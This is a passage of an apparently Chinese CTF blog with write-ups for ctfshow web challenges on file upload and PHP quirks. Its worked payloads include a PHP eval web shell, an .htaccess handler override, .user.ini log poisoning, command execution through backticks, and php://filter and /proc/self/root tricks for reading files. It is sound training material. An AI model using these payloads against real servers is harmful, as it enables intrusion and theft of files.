&#x27;images&#x27;,exts:&#x27;zip&#x27;&#125;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>这题限制的是zip后缀，随便找个zip用txt在后面加个一句话木马即可，这题需要反复配合bp食用，首先上传的时候需要注意回显的zip名称，然后post对应的发包，可以多尝试几次，我在本地也测试了好几次</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-20103904.png" alt="2024-09-20103904"></p><h2 id="web167"><a href="#web167" class="headerlink" title="web167"></a>web167</h2><p>本题用的是阿帕奇的，所以使用<code>.htaccess</code>进行上传内容，图片限制是jpg可以看源码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">FilesMatch</span>  &quot;<span class="hljs-attr">shell.jpg</span>&quot;&gt;</span></span><br>SetHandler application/x-httpd-php<br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">FilesMatch</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p>然后就是正常的文件上传</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-20110014.png" alt="2024-09-20110014"></p><h2 id="web168"><a href="#web168" class="headerlink" title="web168"></a>web168</h2><p>加了一点姿势，过滤了<code>eval</code>,<code>system</code>,<code>post</code>,<code>get</code>,可以直接执行命令，反正也是知道具体的flag在哪的，同时本题又改为png上传</p><p>这题可以直接修改为php，先执行ls命令</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`ls ..`;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>flag在flagaa.php里</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../flagaa.php`;<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-20112040.png" alt="2024-09-20112040"></p><h2 id="web169"><a href="#web169" class="headerlink" title="web169"></a>web169</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;button&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;layui-btn&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;upload&quot;</span> <span class="hljs-attr">lay-data</span>=<span class="hljs-string">&quot;&#123;url: &#x27;upload.php&#x27;, accept: &#x27;images&#x27;,exts:&#x27;zip&#x27;&#125;&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>前端检测zip文件，后端要求png文件这题过滤了<code>&lt;</code>,这题的思路，大概就是上传一个zip</p><p>首先创建一个index.zip，上传之后修改为php并且把文件形式改成png</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-20114308.png" alt="2024-09-20114308"></p><p>然后创建<code>.user.ini.zip</code>,里面的内容就是日志包含</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">GIF89a<br>auto<span class="hljs-emphasis">_prepend_</span>file=/var/log/nginx/access.log<br></code></pre></td></tr></table></figure><p>上传之后和上面一样改，同时在UA里面进行修改写入一个马得到flag，flag在flagaa.php</p><h2 id="web170"><a href="#web170" class="headerlink" title="web170"></a>web170</h2><p>和上一题基本一致</p>]]></content>
    
    
    <categories>
      
      <category>每日一题</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件上传</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow-php特性</title>
    <link href="/2024/09/17/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshowphp%E7%89%B9%E6%80%A7/"/>
    <url>/2024/09/17/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/ctfshowphp%E7%89%B9%E6%80%A7/</url>
    
    <content type="html"><![CDATA[<h2 id="web89"><a href="#web89" class="headerlink" title="web89"></a>web89</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num[]=a<br></code></pre></td></tr></table></figure><h2 id="web90"><a href="#web90" class="headerlink" title="web90"></a>web90</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=+4476<br></code></pre></td></tr></table></figure><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476e1<br></code></pre></td></tr></table></figure><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=0x117c<br></code></pre></td></tr></table></figure><h2 id="web91"><a href="#web91" class="headerlink" title="web91"></a>web91</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?cmd=%0aphp<br></code></pre></td></tr></table></figure><h2 id="web92"><a href="#web92" class="headerlink" title="web92"></a>web92</h2><h3 id="0x01-1"><a href="#0x01-1" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure><h3 id="0x02-1"><a href="#0x02-1" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476e1<br></code></pre></td></tr></table></figure><h2 id="web92-1"><a href="#web92-1" class="headerlink" title="web92"></a>web92</h2><h3 id="0x01-2"><a href="#0x01-2" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure><h3 id="0x02-2"><a href="#0x02-2" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=010574<br></code></pre></td></tr></table></figure><h2 id="web93"><a href="#web93" class="headerlink" title="web93"></a>web93</h2><h3 id="0x01-3"><a href="#0x01-3" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.11<br></code></pre></td></tr></table></figure><h3 id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=010574<br></code></pre></td></tr></table></figure><h2 id="web94"><a href="#web94" class="headerlink" title="web94"></a>web94</h2><h3 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=4476.02<br></code></pre></td></tr></table></figure><h3 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0a010574<br></code></pre></td></tr></table></figure><h2 id="web95"><a href="#web95" class="headerlink" title="web95"></a>web95</h2><h3 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0a010574<br></code></pre></td></tr></table></figure><h3 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=+010574<br></code></pre></td></tr></table></figure><h2 id="web96"><a href="#web96" class="headerlink" title="web96"></a>web96</h2><h3 id="0x01-6"><a href="#0x01-6" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=php://filter/convert.base64-encode/resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="0x02-6"><a href="#0x02-6" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=./flag.php<br></code></pre></td></tr></table></figure><h3 id="0x03-1"><a href="#0x03-1" class="headerlink" title="0x03"></a>0x03</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?u=/var/www/html/flag.php<br></code></pre></td></tr></table></figure><h2 id="web97"><a href="#web97" class="headerlink" title="web97"></a>web97</h2><h3 id="0x01-7"><a href="#0x01-7" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">a[]=1&amp;b[]=2<br></code></pre></td></tr></table></figure><h3 id="0x02-7"><a href="#0x02-7" class="headerlink" title="0x02"></a>0x02</h3><p>用fastcoll进行生成</p><h2 id="web98"><a href="#web98" class="headerlink" title="web98"></a>web98</h2><p>按要求进行传参就行了，cookie，post,FLAG，等等</p><h2 id="web99"><a href="#web99" class="headerlink" title="web99"></a>web99</h2><p>先了解一下in_array函数，如图</p><p><img src="/../../images/%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/2024-09-15215426.png" alt="2024-09-15215426"></p><p>in_array是用于检查数组里有没有对应的内容，正常是需要传三个值，第一个值是要搜索的值，可以是字符串、整数等。第二个值是要搜索的数组，即是否存在这个数组，第三个是可选当设置为 <code>true</code> 时，<code>in_array()</code> 不仅检查值是否相同，还会检查类型是否相同。如果未设置或为 <code>false</code>，则不会比较类型。本题就是由于第三个没有导致的弱比教漏洞</p><p>所以根据题目要求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?n=1.php<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">content=&lt;?php <span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[1]);?&gt;<br></code></pre></td></tr></table></figure><p>然后进入1.php执行ls，最后执行得到flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">1=system(<span class="hljs-string">&#x27;tac flag36d.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="web100"><a href="#web100" class="headerlink" title="web100"></a>web100</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=0&amp;v2=show_source(system(<span class="hljs-string">&#x27;ls&#x27;</span>))&amp;v3=;<br></code></pre></td></tr></table></figure><p>测试完忘记读题，在$ctfshow里面</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=0&amp;v2=var_dump(<span class="hljs-variable">$ctfshow</span>)&amp;v3=;<br></code></pre></td></tr></table></figure><h2 id="web101"><a href="#web101" class="headerlink" title="web101"></a>web101</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php<br><br>/*<br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2020-09-22 00:26:48</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br>*/<br><br>highlight_file(__FILE__);<br>include(<span class="hljs-string">&quot;ctfshow.php&quot;</span>);<br>//flag <span class="hljs-keyword">in</span> class ctfshow;<br><span class="hljs-variable">$ctfshow</span> = new ctfshow();<br><span class="hljs-variable">$v1</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v0</span>=is_numeric(<span class="hljs-variable">$v1</span>) and is_numeric(<span class="hljs-variable">$v2</span>) and is_numeric(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v0</span>)&#123;<br>    <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\;|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v2</span>))&#123;<br>        <span class="hljs-keyword">if</span>(!preg_match(<span class="hljs-string">&quot;/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\&#123;|\[|\&quot;|\&#x27;|\,|\.|\?|[0-9]/&quot;</span>, <span class="hljs-variable">$v3</span>))&#123;<br>            <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;<span class="hljs-variable">$v2</span>(&#x27;ctfshow&#x27;)<span class="hljs-variable">$v3</span>&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>&#125;<br><br>?&gt;<br></code></pre></td></tr></table></figure><p>没遇过学习一下，反射，ReflectionClass：一个反射类，功能十分强大，内置了各种获取类信息的方法，创建方式为new ReflectionClass(str 类名)，可以用echo new ReflectionClass(‘className’)打印类的信息。</p><p>ReflectionObject：另一个反射类，创建方式为new ReflectionObject(对象名)。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=1&amp;v2=<span class="hljs-built_in">echo</span> new Reflectionclass&amp;v3=;<br></code></pre></td></tr></table></figure><h2 id="web102"><a href="#web102" class="headerlink" title="web102"></a>web102</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: atao</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-16 11:25:09</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-23 20:59:43</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$v1</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;v1&#x27;</span>];<br><span class="hljs-variable">$v2</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v2&#x27;</span>];<br><span class="hljs-variable">$v3</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;v3&#x27;</span>];<br><span class="hljs-variable">$v4</span> = <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v2</span>) <span class="hljs-keyword">and</span> <span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$v3</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$v4</span>)&#123;<br>    <span class="hljs-variable">$s</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$v2</span>,<span class="hljs-number">2</span>);<br>    <span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$v1</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v3</span>,<span class="hljs-variable">$str</span>);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>call_user_func</code>函数是用于调用一个回调函数，$s从第二个开始读取，<code>file_put_contents</code>可以写入文件</p><p>v3用伪协议写入一个文件<code>v3=php://filter/write=convert.base64-decode/resource=1.php</code></p><p>还需要讲的是短标签<code>&lt;?=</code>就相当于<code>&lt;?php echo</code>，我们需要构造,末尾有空格</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`cat *`; <br></code></pre></td></tr></table></figure><p>先进行base64,原因是我们写入的时候用了base64，然后进行hex,最后再编码前面加两位</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v2=115044383959474e686443417159447367<br></code></pre></td></tr></table></figure><p>最后<code>v1=hex2bin</code>进行转化进行，到1.php里看答案</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v2=115044383959474e686443417159447367&amp;v3=php://filter/write=convert.base64-decode/resource=1.php<br></code></pre></td></tr></table></figure><h2 id="web103"><a href="#web103" class="headerlink" title="web103"></a>web103</h2><p>用上面102的payload可以正常打通</p><h2 id="web104"><a href="#web104" class="headerlink" title="web104"></a>web104</h2><h3 id="0x01-8"><a href="#0x01-8" class="headerlink" title="0x01"></a>0x01</h3><p>数组绕过</p><h3 id="0x02-8"><a href="#0x02-8" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v2=aaK1STfY<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v1=aaroZmOk<br></code></pre></td></tr></table></figure><h2 id="web105"><a href="#web105" class="headerlink" title="web105"></a>web105</h2><p>本地考察了变量覆盖</p><p>先上payload</p><h3 id="0x01-9"><a href="#0x01-9" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?suces=flag<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">error=suces<br></code></pre></td></tr></table></figure><p>原理就是$suces&#x3D;$flag,然后post发$error&#x3D;$suces，通过串联，达成了$error&#x3D;$flag;</p><h3 id="0x02-9"><a href="#0x02-9" class="headerlink" title="0x02"></a>0x02</h3><p>清空内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?suces=flag&amp;flag=<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">flag=<br></code></pre></td></tr></table></figure><h2 id="web106"><a href="#web106" class="headerlink" title="web106"></a>web106</h2><p>同web104</p><h2 id="web107"><a href="#web107" class="headerlink" title="web107"></a>web107</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v3=1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">v1=flag=c4ca4238a0b923820dcc509a6f75849b<br></code></pre></td></tr></table></figure><p><code>parse_str</code> 将 <code>$v1</code> 中的查询字符串解析成一个关联数组，并将解析结果存储在 <code>$v2</code> 中。</p><p>就相当于$v2[flag]&#x3D;c4ca4238a0b923820dcc509a6f75849b，控制两边相等就行了</p><h2 id="web108"><a href="#web108" class="headerlink" title="web108"></a>web108</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?c=a%00778<br></code></pre></td></tr></table></figure><p>ereg用于检测是否只包含字母（大小写），<code>0x36d</code> 的十进制值是 877。反转 <code>&quot;877&quot;</code> 得到的字符串是 <code>&quot;778&quot;</code>，</p><p>不过这里的 <code>ereg()</code> 存在截断漏洞, <code>%00</code> 后的字符串不解析构造 <code>a%00778</code> 来绕过 <code>ereg()</code> 的检测</p><h2 id="web109"><a href="#web109" class="headerlink" title="web109"></a>web109</h2><p>使用原生类的内置类进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=DirectoryIterator&amp;v2=system(<span class="hljs-built_in">ls</span>)<br></code></pre></td></tr></table></figure><p>然后使用映射类读取flag</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Reflectionclass&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Exception&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=Error&amp;v2=system(<span class="hljs-string">&#x27;tac fl36dg.txt&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="web110"><a href="#web110" class="headerlink" title="web110"></a>web110</h2><p>根据题目给的hint，先上payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=FilesystemIterator&amp;v2=getcwd<br></code></pre></td></tr></table></figure><p>FilesystemIterator：：__construct — 构造一个新的文件系统迭代器</p><p><code>getcwd()</code> 返回当前工作目录, 即 &#x2F;var&#x2F;ww&#x2F;html。类里面刚好有 <code>__toString</code> 可以 echo 输出</p><h2 id="web111"><a href="#web111" class="headerlink" title="web111"></a>web111</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?v1=ctfshow&amp;v2=GLOBALS<br></code></pre></td></tr></table></figure><p>进行变量覆盖</p><h2 id="web112"><a href="#web112" class="headerlink" title="web112"></a>web112</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/resource=flag.php<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=compress.zlib://flag.php<br></code></pre></td></tr></table></figure><h2 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=compress.zlib://flag.php<br></code></pre></td></tr></table></figure><p>官p是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p<br>roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro<br>c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/<br>self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se<br>lf/root/proc/self/root/var/www/html/flag.php<br></code></pre></td></tr></table></figure><p>这是一个 Linux 环境中的路径表达式，表示通过不断递归访问 <code>/proc/self/root</code> 来尝试访问最终的目标文件 <code>/var/www/html/flag.php</code>。利用函数所能处理的长度限制进行目录溢出,超过is_file能处理的最大长度就不认为是个文件了。</p><h2 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h2><h3 id="0x01-10"><a href="#0x01-10" class="headerlink" title="0x01"></a>0x01</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=php://filter//resource=flag.php<br></code></pre></td></tr></table></figure><h3 id="0x02-10"><a href="#0x02-10" class="headerlink" title="0x02"></a>0x02</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?file=Php://filter/zlib.deflate|zlib.inflate/resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web115"><a href="#web115" class="headerlink" title="web115"></a>web115</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?num=%0c36<br></code></pre></td></tr></table></figure><p>利用 PHP 的宽松类型比较特性</p><p>由于 <code>$num</code> 的原始值是 <code>&quot;\x0c36&quot;</code>，它通过了 <code>is_numeric()</code> 检查，且不严格等于 <code>&#39;36&#39;</code>，同时经过 <code>filter()</code> 处理后的值仍为 <code>&#39;36&#39;</code>。</p><h2 id="web123"><a href="#web123" class="headerlink" title="web123"></a>web123</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Author</span>: Firebasky</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Date</span>:   2020-09-05 20:49:30</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified by:   h1xa</span><br><span class="hljs-comment"># <span class="hljs-doctag">@Last</span> Modified time: 2020-09-07 22:02:47</span><br><span class="hljs-comment"># <span class="hljs-doctag">@email</span>: h1xa<span class="hljs-doctag">@ctfer</span>.com</span><br><span class="hljs-comment"># <span class="hljs-doctag">@link</span>: https://ctfer.com</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><span 